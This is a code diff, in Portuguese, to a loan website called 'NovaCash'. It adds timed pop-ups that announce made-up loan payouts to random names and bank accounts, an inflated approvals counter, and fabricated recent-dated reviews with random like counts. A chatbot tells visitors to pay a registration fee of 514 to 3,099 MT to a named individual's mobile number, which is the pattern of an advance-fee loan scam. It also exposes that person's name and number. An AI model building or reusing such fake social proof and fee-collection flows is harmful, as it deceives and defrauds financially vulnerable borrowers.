+                            <span class="notif-status"><i class="fas fa-check-circle"></i> Confirmado</span>
+                        </div>
+                        <div class="notif-body">
+                            <div class="notif-row"><span class="label">ID Transação</span><span class="value" style="font-family:monospace;font-size:0.7rem;">${emolaId}</span></div>
+                            <div class="notif-row"><span class="label">Nome</span><span class="value">${fullName}</span></div>
+                            <div class="notif-row"><span class="label">Recebeu</span><span class="value highlight">${amountStr} MT</span></div>
+                            <div class="notif-row" style="background:rgba(255,107,0,0.04);border-radius:8px;padding:0.3rem 0.5rem;margin-top:0.2rem;">
+                                <span class="label" style="font-size:0.65rem;">Do Agente</span>
+                                <span style="display:flex;flex-direction:column;align-items:flex-end;">
+                                    <span style="font-size:0.7rem;color:var(--gray);">Código: ${agentCode}</span>
+                                    <span style="font-weight:600;font-size:0.75rem;color:#FF6B00;">NOVACASH</span>
+                                </span>
+                            </div>
+                        </div>
+                        <div class="notif-footer">
+                            <span class="notif-time"><i class="far fa-clock"></i> ${formatDateForEmola(now)}</span>
+                            <span class="notif-badge"><i class="fas fa-check"></i> Recebido</span>
+                        </div>
+                    </div>`;
+            } else {
+                const accountNumber = uniqueValue(generateAccountNumber);
+                const bank = getRandomBank();
+                methodLabel = 'Banco';
+                methodKey = 'bank';
+                extra = { accountNumber, bank };
+                html = `
+                    <div class="loan-notification" style="border-left-color:#1A237E;">
+                        <button class="notif-close" aria-label="Fechar">&times;</button>
+                        <div class="notif-header">
+                            <span class="notif-method"><i class="fas fa-university" style="color:#1A237E;"></i> Transferência Bancária</span>
+                            <span class="notif-status"><i class="fas fa-check-circle"></i> Confirmada</span>
+                        </div>
+                        <div class="notif-body">
+                            <div class="notif-row" style="margin-bottom:0.3rem;"><span class="label">Destinatário</span><span class="value">${fullName}</span></div>
+                            <div class="notif-row"><span class="label">Valor</span><span class="value highlight">${amountStr} MZN</span></div>
+                            <div class="notif-row" style="background:rgba(26,35,126,0.04);border-radius:8px;padding:0.3rem 0.5rem;margin-top:0.2rem;">
+                                <span class="label" style="font-size:0.65rem;">Conta</span>
+                                <span style="display:flex;flex-direction:column;align-items:flex-end;">
+                                    <span style="font-family:monospace;font-size:0.75rem;font-weight:600;">${accountNumber}</span>
+                                    <span style="font-size:0.65rem;color:var(--gray);">${bank}</span>
+                                </span>
+                            </div>
+                        </div>
+                        <div class="notif-footer">
+                            <span class="notif-time"><i class="far fa-clock"></i> ${formatDateForBank(now)} • ${formatTimeForBank(now)}</span>
+                            <span class="notif-badge"><i class="fas fa-check"></i> Recebido</span>
+                        </div>
+                    </div>`;
+            }
+
+            return {
+                id: 'ln_' + now.getTime() + '_' + Math.floor(Math.random() * 10000),
+                name: fullName,
+                amount,
+                method: methodKey,
+                methodLabel,
+                extra,
+                timestamp: now,
+                html
+            };
+        }
+
+        // Mostra a notificação flutuante no topo (mesmo cartão que vai para Atividades)
+        function showFloatingLoanNotification(notif) {
+            const stack = document.getElementById('loanToastStack');
+            if (!stack) return;
+            const wrap = document.createElement('div');
+            wrap.innerHTML = notif.html.trim();
+            const el = wrap.firstElementChild;
+            if (!el) return;
+            stack.appendChild(el);
+
+            // Fechar manualmente
+            const closeBtn = el.querySelector('.notif-close');
+            const remove = () => {
+                if (!el.isConnected) return;
+                el.classList.add('leaving');
+                setTimeout(() => el.remove(), 400);
+            };
+            if (closeBtn) closeBtn.addEventListener('click', remove);
+
+            // Auto-remover após 6-8s; nunca acumular mais que 3 cartões
+            setTimeout(remove, 6500 + Math.random() * 1500);
+            while (stack.children.length > 3) {
+                stack.firstElementChild && stack.firstElementChild.remove();
+            }
+        }
+
+        function showLoanNotification() {
+            if (typeof availableFundsMZN !== 'undefined' && availableFundsMZN <= 0) return;
+
+            const notif = buildLoanNotification();
+
+            // 1) Deduzir fundos
+            if (typeof deductFunds === 'function') deductFunds(notif.amount);
+
+            // 2) Som
+            if (typeof playNotificationSound === 'function') playNotificationSound();
+
+            // 3) Cartão flutuante no topo
+            showFloatingLoanNotification(notif);
+
+            // 4) Adicionar à página de Notificações (mesmo HTML)
+            const container = document.getElementById('notifList');
+            if (container) {
+                const tmp = document.createElement('div');
+                tmp.innerHTML = notif.html.trim();
+                const el = tmp.firstElementChild;
+                const closeBtn = el && el.querySelector('.notif-close');
+                if (closeBtn) closeBtn.remove(); // sem "x" na página fixa
+                if (el) {
+                    container.insertBefore(el, container.firstChild);
+                    while (container.children.length > 30) container.removeChild(container.lastChild);
+                }
+            }
+
+            // 5) Adicionar às Atividades Recentes (mesmos dados)
+            activityItems.unshift(notif);
+            while (activityItems.length > 8) activityItems.pop();
+            renderActivityItems();
+
+            // 6) Sincronizar estatísticas
+            if (typeof approvedToday !== 'undefined') {
+                approvedToday = Math.min(approvedToday + 1, requestedToday);
+                if (typeof updateStatsDisplay === 'function') updateStatsDisplay();
+            }
+        }
+
+        // ============================================================
+        // INICIAR NOTIFICAÇÕES COM INTERVALO VARIÁVEL (10-30 segundos)
+        // ============================================================
+        function scheduleNextNotification() {
+            const minDelay = 10000;
+            const maxDelay = 30000;
+            const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
+            setTimeout(() => {
+                showLoanNotification();
+                scheduleNextNotification();
+            }, delay);
+        }
+
+        // ============================================================
+        // INICIALIZAR ATIVIDADES E NOTIFICAÇÕES
+        // ============================================================
         generateInitialActivities();
         setInterval(refreshActivities, 3600000);
         setInterval(cleanOldActivities, 300000);
+
+        // Iniciar notificações após 3 segundos
+        setTimeout(() => {
+            showLoanNotification();
+            scheduleNextNotification();
+        }, 3000);
 
         // ============================================================
         // LOGIN COM 7 SEGUNDOS
@@ -3474,7 +3974,7 @@
         }
 
         // ============================================================
-        // SISTEMA DE FOTO DE PERFIL - ATUALIZAÇÃO EM TODOS OS LUGARES
+        // SISTEMA DE FOTO DE PERFIL
         // ============================================================
         function updateAllAvatars(user) {
             const initials = user.fullName.split(' ').map(n => n[0]).join('').toUpperCase().slice(0, 2);
@@ -3705,7 +4205,7 @@
         });
 
         // ============================================================
-        // CHAT SYSTEM
+        // CHAT SYSTEM - COM NOVAS PERGUNTAS E RESPOSTAS
         // ============================================================
         const chatFab = document.getElementById('chatFab');
         const chatWindow = document.getElementById('chatWindowApp');
@@ -3737,12 +4237,20 @@
             chatMessages.scrollTop = chatMessages.scrollHeight;
         }
 
+        // ============================================================
+        // CHAT BOT RESPONSE - COM NOVA PERGUNTA ADICIONADA
+        // ============================================================
         function chatBotResponse(input) {
             const lower = input.toLowerCase();
+            
+            if (lower.includes('taxa de inscrição') || lower.includes('serve a taxa') || lower.includes('para que serve a taxa')) {
+                return '📝 PARA QUE SERVE A TAXA DE INSCRIÇÃO? 🤔\n\nA taxa de inscrição destina-se a cobrir os custos administrativos e operacionais da análise de crédito e do processamento da sua solicitação.\n\nEla permite que o seu pedido seja analisado de forma segura, organizada e transparente, contribuindo para a verificação das informações, a prevenção de fraudes e a agilidade no processo de avaliação.\n\n⚠️ Importante: O valor da taxa de inscrição varia de acordo com o valor do empréstimo solicitado. Antes de efetuar o pagamento, verifique sempre o valor correspondente ao seu pedido.';
+            }
+            
             if (lower.includes('tempo') || lower.includes('demora') || lower.includes('receber')) {
                 return 'O tempo de recebimento do empréstimo varia entre 8 e 30 minutos após a conclusão das etapas necessárias.';
             }
-            if (lower.includes('taxa') || lower.includes('inscrição')) {
+            if (lower.includes('taxa') || lower.includes('inscrição') && !lower.includes('serve')) {
                 return 'A taxa de inscrição varia entre 514 MT e 3.099 MT, dependendo do valor. Pagamento para o número 876364927, nome TIOFELO EDSON LUIS JAIELA.';
             }
             if (lower.includes('localização') || lower.includes('sede') || lower.includes('endereço')) {
@@ -3974,7 +4482,6 @@
         const REVIEWS_STORAGE_KEY = 'novacash_all_reviews';
         const LOVES_STORAGE_KEY = 'novacash_loves';
 
-        // Carregar dados de "Adoro" do localStorage
         let userLoves = {};
 
         function loadLovesFromStorage() {
@@ -4002,55 +4509,39 @@
             return `2026-${String(month).padStart(2,'0')}-${String(day).padStart(2,'0')}`;
         }
 
-        // Função para gerar data aleatória entre Junho e Julho
         function getRandomDate() {
-            const months = [6, 7]; // Junho e Julho
+            const months = [6, 7];
             const month = months[Math.floor(Math.random() * months.length)];
             const maxDay = month === 6 ? 30 : 31;
             const day = Math.floor(Math.random() * maxDay) + 1;
             return generateReviewDate(month, day);
         }
 
-        // Função para gerar data muito recente (últimos dias/horas)
         function getRecentDate() {
             const now = new Date();
             const options = [
-                { days: 0, hours: 0, minutes: 30 }, // hoje, 30 min
-                { days: 0, hours: 0, minutes: 45 }, // hoje, 45 min
-                { days: 0, hours: 1, minutes: 0 }, // hoje, 1 hora
-                { days: 0, hours: 2, minutes: 0 }, // hoje, 2 horas
-                { days: 0, hours: 5, minutes: 0 }, // hoje, 5 horas
-                { days: 1, hours: 0, minutes: 0 }, // ontem
-                { days: 2, hours: 0, minutes: 0 }, // 2 dias atrás
-                { days: 3, hours: 0, minutes: 0 }, // 3 dias atrás
-                { days: 4, hours: 0, minutes: 0 }, // 4 dias atrás
-                { days: 5, hours: 0, minutes: 0 }, // 5 dias atrás
-                { days: 6, hours: 0, minutes: 0 }, // 6 dias atrás
-                { days: 7, hours: 0, minutes: 0 }, // 7 dias atrás
-                { days: 10, hours: 0, minutes: 0 }, // 10 dias atrás
-                { days: 14, hours: 0, minutes: 0 }, // 14 dias atrás
-                { days: 20, hours: 0, minutes: 0 }, // 20 dias atrás
-                { days: 25, hours: 0, minutes: 0 } // 25 dias atrás
+                { days: 0, hours: 0, minutes: 30 },
+                { days: 0, hours: 0, minutes: 45 },
+                { days: 0, hours: 1, minutes: 0 },
+                { days: 0, hours: 2, minutes: 0 },
+                { days: 0, hours: 5, minutes: 0 },
+                { days: 1, hours: 0, minutes: 0 },
+                { days: 2, hours: 0, minutes: 0 },
+                { days: 3, hours: 0, minutes: 0 },
+                { days: 4, hours: 0, minutes: 0 },
+                { days: 5, hours: 0, minutes: 0 },
+                { days: 6, hours: 0, minutes: 0 },
+                { days: 7, hours: 0, minutes: 0 },
+                { days: 10, hours: 0, minutes: 0 },
+                { days: 14, hours: 0, minutes: 0 },
+                { days: 20, hours: 0, minutes: 0 },
+                { days: 25, hours: 0, minutes: 0 }
             ];
 
-            // Distribuição: maioria dos comentários com 7-14 dias atrás, alguns muito recentes
             const weights = [
-                0.08, // 30 min
-                0.07, // 45 min
-                0.06, // 1 hora
-                0.05, // 2 horas
-                0.04, // 5 horas
-                0.10, // ontem
-                0.10, // 2 dias
-                0.08, // 3 dias
-                0.06, // 4 dias
-                0.05, // 5 dias
-                0.05, // 6 dias
-                0.06, // 7 dias
-                0.07, // 10 dias
-                0.06, // 14 dias
-                0.04, // 20 dias
-                0.03 // 25 dias
+                0.08, 0.07, 0.06, 0.05, 0.04,
+                0.10, 0.10, 0.08, 0.06, 0.05,
+                0.05, 0.06, 0.07, 0.06, 0.04, 0.03
             ];
 
             let rand = Math.random();
@@ -4075,7 +4566,6 @@
             return date.toISOString().split('T')[0];
         }
 
-        // Função para formatar data para exibição
         function formatDateDisplay(dateStr) {
             if (!dateStr) return '';
             const date = new Date(dateStr);
@@ -4100,12 +4590,12 @@
             return `${date.getDate()} de ${meses[date.getMonth()]}`;
         }
 
-        // Função para gerar uma data recente para exibição
         function getRecentDateForDisplay() {
             const dateStr = getRecentDate();
             return dateStr;
         }
 
+        // ===== AVALIAÇÕES COM NOMES COMPLETOS =====
         const defaultReviewsData = [
             // ===== AVALIAÇÕES 5 ESTRELAS =====
             { name: 'Júlia Manjate', city: 'Maputo', rating: 5, text: 'Recebi o meu empréstimo rapidamente. Atendimento excelente e muito profissional. Recomendo a todos os meus amigos.', date: getRecentDateForDisplay() },
@@ -4276,12 +4766,10 @@
         const nextBtn = document.getElementById('sliderNext');
         const wrapper = document.getElementById('reviewsSliderWrapper');
 
-        // Função para gerar contador de "Adoro" entre 8 e 18
         function getRandomLoveCount() {
             return Math.floor(Math.random() * 11) + 8;
         }
 
-        // Armazenar contadores de "Adoro" por review - persistente
         let reviewLoveCounts = {};
 
         function loadLoveCountsFromStorage() {
@@ -4312,7 +4800,6 @@
             return reviewLoveCounts[reviewKey];
         }
 
-        // Verificar se o usuário já curtiu este review
         function hasUserLovedReview(reviewKey) {
             if (!currentUser) return false;
             const userKey = currentUser.phone || currentUser.fullName;
@@ -4320,7 +4807,6 @@
             return userLoves[loveKey] === true;
         }
 
-        // Toggle love
         function toggleLoveReview(reviewKey) {
             if (!currentUser) {
                 showToast('Faça login para adicionar ❤️ Adoro', 'info');
@@ -4331,7 +4817,6 @@
             const loveKey = `${userKey}-${reviewKey}`;
             
             if (userLoves[loveKey]) {
-                // Remover amor
                 delete userLoves[loveKey];
                 if (reviewLoveCounts[reviewKey] !== undefined) {
                     reviewLoveCounts[reviewKey] = Math.max(0, reviewLoveCounts[reviewKey] - 1);
@@ -4340,7 +4825,6 @@
                 saveLoveCountsToStorage();
                 return false;
             } else {
-                // Adicionar amor
                 userLoves[loveKey] = true;
                 if (reviewLoveCounts[reviewKey] !== undefined) {
                     reviewLoveCounts[reviewKey] += 1;
@@ -4370,7 +4854,8 @@
             featured.forEach((review) => {
                 const card = document.createElement('div');
                 card.className = 'review-card-premium';
-                const initials = review.name.split(' ').map(n => n[0]).join('').toUpperCase().slice(0, 2);
+                const nameFull = review.name;
+                const initials = nameFull.split(' ').map(n => n[0]).join('').toUpperCase().slice(0, 2);
                 const fullStars = Math.floor(review.rating);
                 const emptyStars = 5 - fullStars;
                 const stars = '★'.repeat(fullStars) + '☆'.repeat(emptyStars);
@@ -4403,7 +4888,6 @@
             updateDots();
             goToSlide(0);
 
-            // Adicionar eventos de "Adoro" no carrossel
             document.querySelectorAll('.review-card-premium .review-love').forEach(btn => {
                 btn.addEventListener('click', function(e) {
                     e.stopPropagation();
@@ -4420,7 +4904,6 @@
                             } else {
                                 this.classList.remove('loved');
                             }
-                            // Atualizar também na lista
                             updateAllReviewLoves(key);
                         }
                     }
@@ -4428,7 +4911,6 @@
             });
         }
 
-        // Função para atualizar o estado de amor em todos os lugares
         function updateAllReviewLoves(reviewKey) {
             const loveCount = getLoveCountForReview(reviewKey);
             const isLoved = hasUserLovedReview(reviewKey);
@@ -4533,7 +5015,6 @@
             const badge = document.getElementById('reviewCountBadge');
             if (!container) return;
 
-            // Ordenar por data (mais recentes primeiro)
             const sorted = [...allReviews].sort((a, b) => new Date(b.date) - new Date(a.date));
             badge.textContent = sorted.length;
 
@@ -4541,7 +5022,8 @@
             sorted.forEach(review => {
                 const div = document.createElement('div');
                 div.className = 'review-list-item';
-                const initials = review.name.split(' ').map(n => n[0]).join('').toUpperCase().slice(0, 2);
+                const nameFull = review.name;
+                const initials = nameFull.split(' ').map(n => n[0]).join('').toUpperCase().slice(0, 2);
                 const fullStars = Math.floor(review.rating);
                 const emptyStars = 5 - fullStars;
                 const stars = '★'.repeat(fullStars) + '☆'.repeat(emptyStars);
@@ -4569,7 +5051,6 @@
                 container.appendChild(div);
             });
 
-            // Adicionar eventos de "Adoro" na lista de avaliações
             document.querySelectorAll('#allReviewsList .review-love').forEach(btn => {
                 btn.addEventListener('click', function(e) {
                     e.stopPropagation();
@@ -4581,7 +5062,6 @@
                             const loveCount = getLoveCountForReview(key);
                             if (countSpan) countSpan.textContent = loveCount;
                             this.classList.toggle('loved', newState);
-                            // Atualizar também no carrossel
                             updateAllReviewLoves(key);
                         }
                     }
@@ -4934,5 +5414,4 @@
     });
     </script>
 </body>
-</html>                       
-              
+</html>
